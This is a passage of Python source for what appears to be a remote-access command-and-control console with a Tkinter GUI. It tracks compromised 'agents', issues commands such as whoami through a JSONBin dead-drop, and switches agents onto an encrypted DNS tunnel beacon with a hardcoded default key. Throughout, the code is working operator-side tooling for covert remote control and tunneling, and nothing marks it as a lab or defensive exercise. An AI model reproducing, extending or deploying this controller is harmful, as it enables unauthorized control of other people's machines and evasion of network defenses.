            self.root.after(0, lambda: self._log_system(
                f"SYS: HTTP agent detected: {agent['device_name']}"))
        else:
            self.root.after(0, lambda: self._log_system(
                "SYS: No active agents found"))

    def update_http_agent_display(self, agent_data):
        if not agent_data:
            return
        saved = self.load_agents()
        if any(a.get('device_name') == agent_data['device_name']
               and a.get('device_ip') == agent_data['device_ip']
               for a in saved):
            self.refresh_treeview()
            return

        for item in self.tree.get_children():
            self.tree.delete(item)
        for a in saved:
            s  = a.get('device_status', 'unknown')
            m  = "DNS" if a.get('dns_ready') else "HTTP"
            os_v = a.get('os_version', 'Windows 10')
            iid = self.tree.insert("", "end", values=(
                a.get('device_name', 'Unknown'),
                a.get('device_ip',   'N/A'),
                os_v, m, s.upper()))
            tag = ('active'    if s == 'active'
                   else 'connecting' if s == 'connecting'
                   else 'inactive')
            self.tree.item(iid, tags=(tag,))

        temp_item = self.tree.insert("", "end", values=(
            agent_data['device_name'],
            agent_data['device_ip'],
            "Unknown", "HTTP",
            agent_data.get('device_status', 'unknown').upper()))
        self.tree.item(temp_item, tags=('mode0',))
        self.temp_http_agent = agent_data
        self._log_m(f"SYS: Temporary agent displayed: {agent_data['device_name']}")

    def _set_active_http_agent(self, agent_data: dict):
        new_id     = (agent_data.get('device_name', '') + "_" +
                      agent_data.get('device_ip',   ''))
        current_id = ActiveSession.get()
        if current_id == new_id:
            self._log_system(f"Already connected to {agent_data['device_name']}")
            return
        if current_id is not None:
            self._log_system(f"Severing connection to {current_id}...")
            self.cls_json()
            time.sleep(0.5)
        ActiveSession.set(new_id)
        self.selected_agent_data = agent_data
        self._set_controller_state("connected")
        self._log_system(
            f"Active agent: {agent_data['device_name']} ({agent_data['device_ip']})")

    def ctx_connect_http(self):
        if not self.selected_agent_data:
            return
        if not self._acquire_op_lock():
            self._log_system("SYS: Operation already in progress — please wait.")
            return
        self.selected_agent_data.setdefault(
            'api_key', self.api_key_entry.get().strip())
        self.selected_agent_data.setdefault(
            'url', self.url_entry.get().strip())
        self.selected_agent_data.setdefault(
            'bin_id', self.bin_id_entry.get().strip())

        self.selected_agent_data['session_active'] = True
        self.save_agent(self.selected_agent_data)
        self.temp_http_agent = None

        agent_data = dict(self.selected_agent_data)
        new_id = (agent_data.get('device_name', '') + "_" +
                  agent_data.get('device_ip',   ''))
        ActiveSession.set(new_id)
        self.selected_agent_data = agent_data

        self._log_system(
            f"Connecting to {agent_data['device_name']} — "
            "awaiting agent response (10s)...")
        self.refresh_treeview()
        self._handshake_pending = True
        Thread(target=self._send_handshake_with_timeout,
               args=(agent_data,), daemon=True).start()

    def _send_handshake_with_timeout(self, agent_data: dict):
        url       = self.url_entry.get().strip()
        api_key   = self.api_key_entry.get().strip()
        target_id = ActiveSession.get()

        if not url or not api_key or not target_id:
            self._log_m("HANDSHAKE ERROR: Missing credentials or session not set")
            self.root.after(0, self._revert_to_polling,
                            "Connection failed: missing credentials.")
            return

        headers = {"X-Master-Key": api_key, "Content-Type": "application/json"}

        try:
            self.session.put(
                url,
                json={"cmd": "None", "cmd_result": "", "target_id": target_id},
                headers=headers, timeout=3)
            time.sleep(0.5)
        except Exception as e:
            self._log_m(f"HANDSHAKE WARN (pre-clear): {e}")

        try:
            self.session.put(
                url,
                json={"cmd": "cmd-whoami", "target_id": target_id},
                headers=headers, timeout=5)
        except Exception as e:
            self._log_m(f"HANDSHAKE ERROR (stamp): {e}")

        time.sleep(1.0)

        try:
            resp = self.session.put(
                url,
                json={"cmd": "cmd-whoami", "target_id": target_id},
                headers=headers, timeout=5)
            if resp.status_code != 200:
                self._log_m(
                    f"HANDSHAKE WARN: whoami PUT returned {resp.status_code}")
                self.root.after(
                    0, self._revert_to_polling,
                    "Agent did not respond within 10 seconds.\n\n"
                    "The agent may be offline or unreachable.")
                return
        except Exception as e:
            self._log_m(f"HANDSHAKE ERROR (whoami): {e}")
            self.root.after(
                0, self._revert_to_polling,
                "Agent did not respond within 10 seconds.\n\n"
                "The agent may be offline or unreachable.")
            return

        deadline = time.time() + 10
        while time.time() < deadline:
            time.sleep(1.5)
            try:
                get_resp = self.session.get(
                    url, headers={"X-Master-Key": api_key}, timeout=5)
                if get_resp.status_code != 200:
                    continue
                record        = self._gr(get_resp.json())
                cmd_result    = record.get("cmd_result",    "")
                responding_id = record.get("responding_id", "")

                if responding_id and responding_id != target_id:
                    self._log_m(
                        f"HANDSHAKE: Ignored stray reply from '{responding_id}'")
                    continue

                if (cmd_result and cmd_result.strip()
                        and cmd_result not in ("None", "executing...")):
                    try:
                        self.session.put(
                            url,
                            json={"cmd": "None", "cmd_result": "",
                                  "target_id": target_id},
                            headers=headers, timeout=3)
                    except Exception:
                        pass
                    self.update_queue.put(("command_result", cmd_result))
                    self._log_m(
                        f"HANDSHAKE: Agent confirmed — "
                        f"{cmd_result.strip()[:80]}")
                    self.root.after(0, self._confirm_connected, agent_data)
                    return
            except Exception as e:
                self._log_m(f"HANDSHAKE WARN (poll): {e}")

        self.root.after(
            0, self._revert_to_polling,
            "Agent did not respond within 10 seconds.\n\n"
            "The agent may be offline or unreachable.")

    def _confirm_connected(self, agent_data: dict, cmd_result: str = ""):
        self._handshake_pending = False
        self._release_op_lock()
        self.selected_agent_data = agent_data
        self._set_active_http_agent(agent_data)
        self._set_controller_state("connected")
        self.refresh_treeview()
        
        device_name = agent_data.get('device_name', 'agent')
        
        self._log_system(
            f"Connected: {device_name} (Mode 1 — Shell Console enabled)")

        def delayed_log():
            msg = f"[*] Agent connected successfully!"
            self._log_system(msg)

            print(msg)

        self.root.after(500, delayed_log)
        
    def _revert_to_polling(self, reason: str = ""):
        self._handshake_pending = False
        self._release_op_lock()   
        agent_name = (self.selected_agent_data or {}).get('device_name', 'Agent')

        ActiveSession.set(None)

        if self.selected_agent_data:
            try:
                agents = self.load_agents()
                dn  = self.selected_agent_data.get('device_name')
                dip = self.selected_agent_data.get('device_ip')
                for a in agents:
                    if a.get('device_name') == dn and a.get('device_ip') == dip:
                        a['session_active'] = False
                with open(AGENTS_FILE, 'w') as f:
                    json.dump(agents, f, indent=4)
            except Exception as e:
                self._log_m(f"WARN: Could not revert agent record: {e}")

        self.selected_agent_data = None

        for item in self.tree.selection():
            self.tree.selection_remove(item)

        self._set_controller_state("polling")
        self._log_system(
            f"Connection to {agent_name} failed — reverted to polling.")

        messagebox.showwarning(
            "Connection Timeout", f"{agent_name}: {reason}")

    def on_dns_click(self):
        if not self.selected_agent_data:
            self._log_system("SYS: Please select an agent first")
            return

        if 'api_key' not in self.selected_agent_data or \
                'url' not in self.selected_agent_data:
            self.selected_agent_data['api_key'] = \
                self.api_key_entry.get().strip()
            self.selected_agent_data['url'] = \
                self.url_entry.get().strip()
            self.selected_agent_data['bin_id'] = \
                self.bin_id_entry.get().strip()

        if (not self.selected_agent_data.get('api_key')
                or not self.selected_agent_data.get('url')):
            self._log_system(
                "ERROR: Missing HTTP credentials — "
                "fill in API Key and URL first")
            return

        dns_domain = self.selected_agent_data.get('dns_domain', '').strip()
        dns_port   = self.selected_agent_data.get('dns_port',   '').strip()
        dns_key    = self.selected_agent_data.get(
            'dns_encryption_key', '').strip()

        if dns_domain and dns_port and dns_key:
            self._log_system(
                f"Using existing DNS config for "
                f"{self.selected_agent_data['device_name']}")
            self._send_dns_isolation_then_connect(self.selected_agent_data)
            return

        self._log_system("Opening DNS configuration window...")
        config_window = DNSConfigWindow(
            self.root, self, self.selected_agent_data)
        self.root.wait_window(config_window.window)

        if not config_window.confirmed:
            self._log_system("DNS configuration cancelled")
            return

        self.selected_agent_data['dns_domain'] = \
            config_window.dns_config['domain']
        self.selected_agent_data['dns_port'] = \
            config_window.dns_config['port']
        self.selected_agent_data['dns_encryption_key'] = \
            config_window.dns_config['encryption_key']

        self.save_agent(self.selected_agent_data)
        self._log_system(
            f"DNS config saved for "
            f"{self.selected_agent_data['device_name']}")
        self._log_system(
            f"  Domain: {config_window.dns_config['domain']}")
        self._log_system(
            f"  Port: {config_window.dns_config['port']}")

        self._send_dns_isolation_then_connect(self.selected_agent_data)

    def _send_dns_isolation_then_connect(self, agent_data: dict):
        url       = agent_data.get('url',     self.url_entry.get().strip())
        api_key   = agent_data.get('api_key', self.api_key_entry.get().strip())
        target_id = (agent_data.get('device_name', '') + "_" +
                     agent_data.get('device_ip',   ''))

        if not url or not api_key:
            self._log_system(
                "ERROR: Missing HTTP credentials for DNS handshake")
            return

        def _resolve_dns_config():
            settings_file = os.path.join(
                JSON_FOLDER, "controller_settings.json")
            if os.path.exists(settings_file):
                try:
                    with open(settings_file, 'r') as f:
                        dns_cfg = json.load(f).get("dns", {})
                except Exception:
                    dns_cfg = {
                        "port": 5353,
                        "domain": "tunnel.local",
                        "encryption_key": "my_secret_dns_key_12345",
                    }
            else:
                dns_cfg = {
                    "port": 5353,
                    "domain": "tunnel.local",
                    "encryption_key": "my_secret_dns_key_12345",
                }

            if (agent_data.get('dns_domain') and
                    agent_data.get('dns_port') and
                    agent_data.get('dns_encryption_key')):
                key    = agent_data.get('dns_encryption_key',
                                        dns_cfg["encryption_key"])
                port   = int(agent_data.get('dns_port', dns_cfg["port"]))
                domain = agent_data.get('dns_domain', dns_cfg["domain"])
            else:
                key    = dns_cfg["encryption_key"]
                port   = int(dns_cfg["port"])
                domain = dns_cfg["domain"]

            agent_ip  = agent_data.get('device_ip', '')
            local_ip  = self.dns_mode._get_local_ip()
            public_ip = self.dns_mode._ip_loc()

            def _is_private(ip):
                if not ip:
                    return True
                return (ip.startswith("10.")       or
                        ip.startswith("192.168.")  or
                        ip.startswith("172.16.")   or
                        ip.startswith("172.17.")   or
                        ip.startswith("172.18.")   or
                        ip.startswith("172.19.")   or
                        ip.startswith("172.2")     or
                        ip.startswith("172.3")     or
                        ip.startswith("127."))

            if agent_ip == local_ip or agent_ip in ('127.0.0.1', 'localhost'):
                server_ip = '127.0.0.1'
                self._log_system("SYS: Same-host agent — using 127.0.0.1")

            elif public_ip and agent_ip == public_ip:
                server_ip = local_ip
                self._log_system(
                    f"SYS: Same-NAT agent detected (shared public IP "
                    f"{public_ip}) — sending LAN IP: {server_ip}")

            elif _is_private(agent_ip):
                server_ip = local_ip
                self._log_system(
                    f"SYS: LAN agent — using local IP: {server_ip}")

            elif public_ip and not _is_private(public_ip):
                server_ip = public_ip
                self._log_system(
                    f"SYS: Cross-network agent — using public IP: {server_ip}")

            else:
                server_ip = local_ip or "127.0.0.1"
                self._log_system(
                    f"SYS: Could not detect public IP — "
                    f"falling back to local: {server_ip}")

            return server_ip, domain, port, key

        def _send_mode_cmd_and_connect(headers):
            server_ip, domain, port, key = _resolve_dns_config()

            self._log_system(
                f"SYS: DNS config resolved — server_ip={server_ip}  "
                f"domain={domain}  port={port}")

            dns_json = json.dumps({
                "server_ip":      server_ip,
                "domain":         domain,
                "port":           str(port),
                "encryption_key": key,
            })
            dns_mode_cmd = f"cmd--dns-mode {dns_json}"

            try:
                self.session.put(
                    url,
                    json={"cmd": "None", "cmd_result": "",
                          "target_id": target_id},
                    headers=headers, timeout=3)
                time.sleep(0.5)
            except Exception as e:
                self._log_system(f"WARN: pre-dns-mode clear failed: {e}")

            try:
                resp = self.session.put(
                    url,
                    json={"cmd": dns_mode_cmd, "target_id": target_id},
                    headers=headers, timeout=5)
                if resp.status_code == 200:
                    self._log_system(
                        "SYS: 'cmd--dns-mode' sent — "
                        "starting beacon immediately...")
                else:
                    self._log_system(
                        f"ERROR: 'cmd--dns-mode' PUT returned "
                        f"{resp.status_code} — aborting")
                    self.root.after(0, lambda: messagebox.showwarning(
                        "Mode Switch Failed",
                        f"Failed to send DNS mode command "
                        f"(HTTP {resp.status_code}).\n"
                        "DNS beacon was NOT started."))
                    return
            except Exception as e:
                self._log_system(
                    f"ERROR: 'cmd--dns-mode' send failed: {e} — aborting")
                self.root.after(0, lambda: messagebox.showwarning(
                    "Mode Switch Failed",
                    f"Network error while sending DNS mode command:\n{e}"))
                return

            self.dns_mode.dns_credentials = {
                'encryption_key': key,
                'domain':         domain,
                'port':           str(port),
                'server_ip':      server_ip,
            }

            time.sleep(1.0)
            self._log_system("SYS: Handing off to DNS beacon...")
            self.root.after(0, lambda: self.connect_to_dns_agent(agent_data))

        if agent_data.get('dns_ready'):
            self._log_system(
                f"SYS: {agent_data.get('device_name')} is already Mode 2 — "
                "skipping HTTP identify, sending DNS config and "
                "starting beacon...")

            def _fast_connect():
                hdrs = {
                    "X-Master-Key": api_key,
                    "Content-Type": "application/json",
                }
                _send_mode_cmd_and_connect(hdrs)

            Thread(target=_fast_connect, daemon=True).start()
            return

        def _do_stamp():
            headers = {
                "X-Master-Key": api_key,
                "Content-Type": "application/json",
            }

            try:
                self.session.put(
                    url,
                    json={"cmd": "None", "cmd_result": "",
                          "target_id": target_id},
                    headers=headers, timeout=3)
                self._log_system("SYS: JSONBin cleared before DNS handshake")
                time.sleep(0.5)
            except Exception as e:
                self._log_system(f"WARN: pre-clear failed: {e}")

            try:
                resp = self.session.put(
                    url,
                    json={"cmd": "cmd-whoami", "target_id": target_id},
                    headers=headers, timeout=5)
                if resp.status_code == 200:
                    self._log_system(
                        f"SYS: Identify probe sent — waiting for "
                        f"agent confirmation (target_id={target_id})...")
                else:
                    self._log_system(
                        f"WARN: cmd-whoami PUT returned "
                        f"{resp.status_code} — aborting")
                    self.root.after(0, lambda: messagebox.showwarning(
                        "DNS Handshake Failed",
                        f"Could not reach JSONBin "
                        f"(HTTP {resp.status_code}).\n"
                        "Check your credentials and try again."))
                    return
            except Exception as e:
                self._log_system(
                    f"ERROR: cmd-whoami send failed: {e} — aborting")
                self.root.after(0, lambda: messagebox.showwarning(
                    "DNS Handshake Failed",
                    f"Network error while probing agent:\n{e}"))
                return

            deadline  = time.time() + 15
            confirmed = False

            while time.time() < deadline:
                time.sleep(1.5)
                try:
                    get_resp = self.session.get(
                        url,
                        headers={"X-Master-Key": api_key},
                        timeout=5)
                    if get_resp.status_code != 200:
                        continue

                    record        = self._gr(get_resp.json())
                    cmd_result    = record.get("cmd_result",    "")
                    responding_id = record.get("responding_id", "")

                    if responding_id and responding_id != target_id:
                        self._log_system(
                            f"SYS: Ignored stray identify reply "
                            f"from '{responding_id}'")
                        continue

                    if (cmd_result
                            and cmd_result.strip()
                            and cmd_result not in ("None", "executing...")):
                        confirmed = True
                        self._log_system(
                            f"SYS: Agent isolation confirmed — "
                            f"{cmd_result.strip()[:80]}")
                            
                        print(f"[*] Agent confirmation received: {cmd_result.strip()}")
                        break

                except Exception as e:
                    self._log_system(f"WARN: identify poll error: {e}")

            if not confirmed:
                self._log_system(
                    f"ERROR: Agent '{target_id}' did not respond to "
                    "cmd-whoami within 15 s — DNS beacon NOT started.")
                self.root.after(0, lambda: messagebox.showwarning(
                    "Agent Not Responding",
                    f"{agent_data.get('device_name', 'Agent')} did not "
                    "respond to the identify probe within 15 seconds.\n\n"
                    "The agent may be offline or unreachable via HTTP.\n"
                    "DNS beacon was NOT started."))
                return

            _send_mode_cmd_and_connect(headers)

        Thread(target=_do_stamp, daemon=True).start()

    def connect_to_dns_agent(self, agent_data: dict):
        with self.mode_lock:
            if self.mode_switching:
                self._log_system("SYS: Connection already in progress")
                return
            self.mode_switching = True
            self._mode_switch_start_time = time.time()

        self._log_system(
            f"Initiating connection to {agent_data.get('device_name')}...")

        if self.dns_mode.current_agent_id:
            self._log_system("Disconnecting from current agent...")
            self.dns_mode.disconnect_current_agent()
            time.sleep(1)

        self.active_mode = "dns"
        save_c_mode("dns")

        updated = agent_data.copy()
        updated['dns_ready'] = True
        updated['device_status'] = 'active'
        self.save_agent(updated)
        self.selected_agent_data = updated

        new_id = (updated.get('device_name', '') + "_" +
                  updated.get('device_ip',   ''))
        self._dns_disconnected_agents.discard(new_id)
        ActiveSession.set(new_id)
        self._set_controller_state("connected")

        self.root.after(0, self.upmdui)
        self.root.after(0, self.refresh_treeview)
        self.root.after(500, self._release_op_lock)

        Thread(target=self.dns_mode.cm_dns,
               args=(agent_data,),
               kwargs={"config_already_sent": True},
               daemon=True).start()

    def on_http_click(self):
        if self.active_mode == "http":
            self._log_system("Refreshing agent list via HTTP...")
            Thread(target=self.poll_http_agents_dashboard, daemon=True).start()
        elif self.active_mode == "dns":
            confirm = messagebox.askyesno(
                "Local Mode Switch",
                "You are about to switch to HTTP Mode.\n\n"
                "This will STOP the current DNS session.\n"
                "The agent may remain in TUNNEL Mode until it times out.\n\n"
                "If you are switching an agent from DNS to HTTP, you can "
                "right-click the specified agent and select "
                "'Switch to HTTP Mode'.\n\n"
                "Proceed with the local switch?")
            if confirm:
                self._log_system(
                    "Stopping local DNS listener (Silent Switch)...")
                if self.dns_mode:
                    self.dns_mode.srvr_stp()
                self.update_active_mode("http")
                self.selected_agent_data = None
                self.refresh_treeview()
                self._log_system("Controller switched to HTTP Mode.")

    def update_active_mode(self, new_mode):
        if new_mode not in ("http", "dns", "jsonbin"):
            new_mode = "http"
        self.active_mode = new_mode
        save_c_mode(new_mode)
        self.root.after(0, self.upmdui)
        self._log_system(f"Mode updated: {new_mode.upper()}")

    def sw_dns(self):
        with self.mode_lock:
            if self.mode_switching:
                self._log_m("SYS: Mode switch already in progress")
                return
            if self.active_mode == "dns":
                self._log_m("Already in TUNNEL mode")
                return
            url     = self.url_entry.get().strip()
            api_key = self.api_key_entry.get().strip()
            if not url or not api_key:
                self._log_m(
                    "ERROR: Missing HTTP credentials — "
                    "cannot switch to TUNNEL")
                messagebox.showerror(
                    "Missing Credentials",
                    "Please fill in BIN ID, API Key, and URL first.")
                return
            self.mode_switching = True
            self._acquire_op_lock()
            self._log_m("SWITCHING TO TUNNEL MODE")
            Thread(target=self.dns_mode.dns_actv, daemon=True).start()

    def jsn_sw(self):
        with self.mode_lock:
            if self.mode_switching:
                self._log_m("SYS: Mode switch already in progress")
                return
            if self.active_mode in ("jsonbin", "http"):
                self._log_m("Already in HTTP mode")
                return
            self.mode_switching = True
            self._acquire_op_lock()
            self._log_m("SWITCHING TO HTTP MODE")
            if self.active_mode == "dns":
                if (self.dns_mode.dns_server
                        and self.dns_mode.current_agent_id):
                    self._log_m("Notifying agent to switch to HTTP...")
                    if self.dns_mode.dns_cmd("-mode jsonbin"):
                        self._log_m("SYS: Mode switch command sent")
                        Thread(target=self.delay1, daemon=True).start()
                    else:
                        self._log_m(
                            "ERROR: Failed to send mode switch command")
                        self.mode_switching = False
                        self._release_op_lock()
                else:
                    self.accepted()
            else:
                self.accepted()

    def refresh_tunnel(self):
        if self.active_mode != "dns":
            self._log_system("Refresh Tunnel only available in TUNNEL mode.")
            return
        self._log_system("Force-restarting DNS server...")
        if self.dns_mode.dns_server and self.dns_mode.dns_server.running:
            self.dns_mode.srvr_stp()
            time.sleep(1)
        previous_agent = self.selected_agent_data
        if self.dns_mode.srvr_strt():
            self._log_system("SYS: DNS server restarted.")
            if previous_agent:
                self._log_system(
                    f"Waiting for {previous_agent['device_name']} "
                    "to reconnect...")
                Thread(target=self.dns_mode.w_specific_agent,
                       args=(previous_agent.get('device_name'),),
                       daemon=True).start()
        else:
            self._log_system("ERROR: Could not restart DNS server.")

    def upmdui(self):
        if self.active_mode == "dns":
            self.btn_refresh_tunnel.config(
                bg=self.colors["blue"], state="normal", relief="sunken")
            self.btn_refresh_http.config(bg="#555555", relief="flat")
            agent_name = (
                getattr(self.dns_mode, 'current_agent_id', None)
                or (self.selected_agent_data and
                    f"Connecting to "
                    f"{self.selected_agent_data.get('device_name', 'Unknown')}")
                or "None")
            self._log_system(f"TUNNEL MODE | Agent: {agent_name}")
        else:
            self.btn_refresh_http.config(
                bg=self.colors["gold"], relief="sunken")
            self.btn_refresh_tunnel.config(
                bg="#555555", state="disabled", relief="flat")
            self._log_system("HTTP MODE | JSONBin polling active")

        if self.active_mode == "http":
            if self.selected_agent_data:
                self.btn_refresh_tunnel.config(
                    state="normal", bg=self.colors["blue"])
            else:
                self.btn_refresh_tunnel.config(
                    state="disabled", bg="#555555")

    def upstats(self, message, color):
        color_map = {
            "green": self.colors["green"],
            "red":   self.colors["red"],
            "gold":  self.colors["gold"],
            "blue":  self.colors["blue"],
        }
        actual_color = color_map.get(color, color)
        if hasattr(self, 'footer_lbl'):
            self.footer_lbl.config(
                text=f"✦ STATUS: {message}", fg=actual_color)
        self._log_m(f"STATUS: {message}")

    def accepted(self):
        try:
            self._log_m("SYS: Finalizing switch to HTTP mode...")
            
            if self.dns_mode.dns_server and self.dns_mode.current_agent_id:
                time.sleep(2)
                final = self.dns_mode.dns_server.agent_r(
                    self.dns_mode.current_agent_id)
                if final:
                    self._log_m(f"Agent final message: {final[:100]}...")

            if self.selected_agent_data:
                updated = self.selected_agent_data.copy()
                updated.update({
                    'dns_ready':          False,
                    'device_status':      'active',
                    'dns_domain':         '',
                    'dns_port':           '',
                    'dns_encryption_key': '',
                })
                self.save_agent(updated)
                self._log_m(
                    "SYS: Agent record updated: Tunnel → HTTP (credentials cleared)")
                self.refresh_selected_agent_from_file()

            self.dns_mode.srvr_stp()
            time.sleep(2)
            self.cls_json()
            self.update_active_mode("http")            
            self._log_m("SYS: Switched to HTTP mode")
            self._log_m("SYS: Waiting for agent to connect...")
            self._log_m("SYS: Sending initial HTTP isolation probe...")
            Thread(target=self._verify_isolation_whoami, daemon=True).start()
            self.root.after(0, self.refresh_treeview)           
            self.root.after(3000, self.verify_http_connection)
            
        except Exception as e:
            self._log_m(f"ERROR during HTTP switch: {e}")
            import traceback
            self._log_m(traceback.format_exc())
        finally:
            self.mode_switching = False
            self.root.after(0, self._release_op_lock)

    def accepted2(self):
        self.accepted()

    def delay1(self):
        self._log_m("SYS: Waiting for agent to complete mode switch...")
        start = time.time()
        while time.time() - start < 15:
            if self.dns_mode.dns_server and self.dns_mode.current_agent_id:
                response = self.dns_mode.dns_server.agent_r(
                    self.dns_mode.current_agent_id)
                if response and "Switching to JSONBin mode" in response:
                    self._log_m("SYS: Agent confirmed mode switch")
                    time.sleep(2)
                    break
            time.sleep(1)
        self.accepted()

    def refresh_selected_agent_from_file(self):
        if not self.selected_agent_data:
            return
        agents = self.load_agents()
        dn  = self.selected_agent_data.get('device_name')
        dip = self.selected_agent_data.get('device_ip')
        for a in agents:
            if a.get('device_name') == dn and a.get('device_ip') == dip:
                self.selected_agent_data = a
                self._log_m(
                    "Agent data refreshed: Mode = "
                    + ('DNS' if a.get('dns_ready') else 'HTTP'))
                break

    def verify_http_connection(self):
        if not getattr(self, 'selected_agent_data', None):
            self._log_m("SYS: Verification aborted - Agent no longer selected.")
            return

        try:
            url     = self.url_entry.get().strip()
            api_key = self.api_key_entry.get().strip()
            if not url or not api_key:
                return
            
            headers  = {"X-Master-Key": api_key}
            response = self.session.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                self._log_m("SYS: HTTP Bin reachable. Sending isolation probe...")
                Thread(target=self._verify_isolation_whoami, daemon=True).start()
            else:
                self.root.after(3000, self.verify_http_connection)
        except Exception as e:
            self._log_m(f"HTTP verification check: {e}")
            self.root.after(3000, self.verify_http_connection)

    def _verify_isolation_whoami(self):
        url       = self.url_entry.get().strip()
        api_key   = self.api_key_entry.get().strip()
        target_id = ActiveSession.get()

        if not url or not api_key:
            self._log_m(
                "VERIFY WARN: Missing credentials — skipping whoami check")
            return

        if not target_id and self.selected_agent_data:
            target_id = (
                self.selected_agent_data.get('device_name', '') + "_" +
                self.selected_agent_data.get('device_ip', ''))
            ActiveSession.set(target_id)

        if not target_id:
            self._log_m(
                "VERIFY WARN: No target_id — cannot isolate agent")
            return

        headers = {"X-Master-Key": api_key, "Content-Type": "application/json"}

        try:
            self.session.put(
                url,
                json={"cmd": "None", "cmd_result": "",
                      "target_id": target_id},
                headers=headers, timeout=3)
            time.sleep(0.5)
        except Exception as e:
            self._log_m(f"VERIFY WARN (pre-clear): {e}")

        try:
            self.session.put(
                url,
                json={"cmd": "cmd-whoami", "target_id": target_id},
                headers=headers, timeout=5)
            time.sleep(1.0)
        except Exception as e:
            self._log_m(f"VERIFY WARN (stamp): {e}")

        try:
            resp = self.session.put(
                url,
                json={"cmd": "cmd-whoami", "target_id": target_id},
                headers=headers, timeout=5)
            if resp.status_code != 200:
                self._log_m(
                    f"VERIFY WARN: whoami PUT returned "
                    f"{resp.status_code} — retrying...")
                self.root.after(3000, self.verify_http_connection)
                return
        except Exception as e:
            self._log_m(f"VERIFY WARN (whoami send): {e}")
            self.root.after(3000, self.verify_http_connection)
            return

        deadline = time.time() + 15
        while time.time() < deadline:
            time.sleep(1.5)
            try:
                get_resp = self.session.get(
                    url, headers={"X-Master-Key": api_key}, timeout=5)
                if get_resp.status_code != 200:
                    continue
                record        = self._gr(get_resp.json())
                cmd_result    = record.get("cmd_result",    "")
                responding_id = record.get("responding_id", "")

                if responding_id and responding_id != target_id:
                    self._log_m(
                        f"VERIFY: Ignored stray reply from '{responding_id}'")
                    continue

                if (cmd_result and cmd_result.strip()
                        and cmd_result not in ("None", "executing...")):
                    try:
                        self.session.put(
                            url,
                            json={"cmd": "None", "cmd_result": "",
                                  "target_id": target_id},
                            headers=headers, timeout=3)
                    except Exception:
                        pass
                    self._log_m(
                        f"VERIFY: Agent confirmed — "
                        f"{cmd_result.strip()[:80]}")
                    self.update_queue.put(("command_result", cmd_result))
                    self.root.after(0, self._verify_commit_connected)
                    return
            except Exception as e:
                self._log_m(f"VERIFY WARN (poll): {e}")

        self._log_m(
            "VERIFY: whoami timeout — agent may still be switching, retrying...")
        self.root.after(3000, self.verify_http_connection)

    def _verify_commit_connected(self):
        if self.selected_agent_data:
            updated = self.selected_agent_data.copy()
            updated.update({
                'dns_ready':      False,
                'device_status':  'active',
                'session_active': True,
            })
            self.save_agent(updated)
            self.refresh_treeview()
        self._set_controller_state("connected")
        self.upstats("Connected", "green")
        self._log_m(
            "SYS: Agent successfully reconnected via HTTP — session active")

    def disconnect_agent(self):
        if not self.selected_agent_data:
            self._log_system("ERROR: No agent selected to disconnect.")
            return

        if not self._acquire_op_lock():
            self._log_system("SYS: Operation already in progress — please wait.")
            return

        agent_data = dict(self.selected_agent_data)
        agent_name = agent_data.get('device_name', 'agent')

        def _patch(fields: dict):
            try:
                agents = self.load_agents()
                dn  = agent_data.get('device_name')
                dip = agent_data.get('device_ip')
                for a in agents:
                    if a.get('device_name') == dn and a.get('device_ip') == dip:
                        a.update(fields)
                with open(AGENTS_FILE, 'w') as f:
                    json.dump(agents, f, indent=4)
            except Exception as e:
                self._log_system(f"WARN: Could not patch agent record: {e}")

        if self.active_mode == "dns":
            self._log_system(f"[DNS] Disconnecting {agent_name}...")

            _disc_key = (agent_data.get('device_name', '') + "_" +
                         agent_data.get('device_ip', ''))
            self._dns_disconnected_agents.add(_disc_key)

            try:
                if self.dns_mode.dns_server and self.dns_mode.current_agent_id:
                    self.dns_mode.dns_cmd("-stop-beacon")
            except Exception as e:
                self._log_system(f"WARN: stop-beacon failed: {e}")
            try:
                self.dns_mode.srvr_stp()
            except Exception as e:
                self._log_system(f"WARN: srvr_stp error: {e}")
            try:
                self.dns_mode.current_agent_id = None
            except Exception:
                pass

            _patch({'device_status': 'disconnected'})

            ActiveSession.set(None)
            self.selected_agent_data      = None
            self.mode_switching           = False
            self.awaiting_command_result  = False
            self.in_interactive_session   = False
            self.interactive_session_name = None
            self.monitor2_loaded          = False
            self.monitor2_loading         = False

            self.active_mode = "http"
            save_c_mode("http")
            self._set_controller_state("polling")
            self.root.after(0, self.upmdui)
            self.root.after(0, self.refresh_treeview)
            self._log_system(f"[DNS] {agent_name} disconnected — beacon stopped.")
            self.root.after(100, self._release_op_lock)
            return

        self._log_system(f"[HTTP] Disconnecting {agent_name}...")
        target_id = ActiveSession.get() or (
            agent_data.get('device_name', '') + "_" +
            agent_data.get('device_ip',   ''))

        ActiveSession.set(None)
        self.selected_agent_data     = None
        self.awaiting_command_result = False

        _patch({'session_active': False})

        self._set_controller_state("polling")
        self.root.after(0, self.refresh_treeview)

        def _send_reload():
            try:
                u  = self.url_entry.get().strip()
                ak = self.api_key_entry.get().strip()
                if not u or not ak:
                    return
                hdrs    = {"X-Master-Key": ak, "Content-Type": "application/json"}
                payload = {"cmd": "cmd--reload-config", "target_id": target_id}
                resp    = self.session.put(u, json=payload, headers=hdrs, timeout=5)
                if resp.status_code == 200:
                    self._log_system(
                        f"Done!")
                else:
                    self._log_system(
                        f"WARN: reload-config response {resp.status_code}.")
            except Exception as e:
                self._log_system(f"WARN: reload-config error: {e}")

        Thread(target=_send_reload, daemon=True).start()
        self._log_system(
            f"[HTTP] {agent_name} disconnected — session cleared, stays Mode 1.")

        self.root.after(100, self._release_op_lock)

    def show_context_menu(self, event):
        item_id = self.tree.identify_row(event.y)
        if not item_id:
            return
        self.tree.selection_set(item_id)
        self.on_agent_select(None)
        if not self.selected_agent_data:
            return

        current_session_id = ActiveSession.get()
        selected_id = (
            f"{self.selected_agent_data.get('device_name', '')}_"
            f"{self.selected_agent_data.get('device_ip', '')}")

        if current_session_id and current_session_id != selected_id:
            return

        f = tkfont.Font(family="Segoe UI", size=10)
        menu = tk.Menu(
            self.root, tearoff=0,
            bg=self.colors["plum_dark"],
            fg=self.colors["spirit_white"],
            activebackground=self.colors["crimson"],
            font=f)

        is_dns  = self.selected_agent_data.get('dns_ready', False)
        is_temp = (hasattr(self, 'temp_http_agent')
                   and self.selected_agent_data is self.temp_http_agent)

        session_active = False
        if not is_temp:
            fresh_agents = self.load_agents()
            fresh = next(
                (a for a in fresh_agents
                 if a.get('device_name') == self.selected_agent_data.get('device_name')
                 and a.get('device_ip')  == self.selected_agent_data.get('device_ip')),
                None)
            if fresh:
                session_active = fresh.get('session_active', False)
                self.selected_agent_data = fresh

        if current_session_id and current_session_id == selected_id:
            if is_temp:
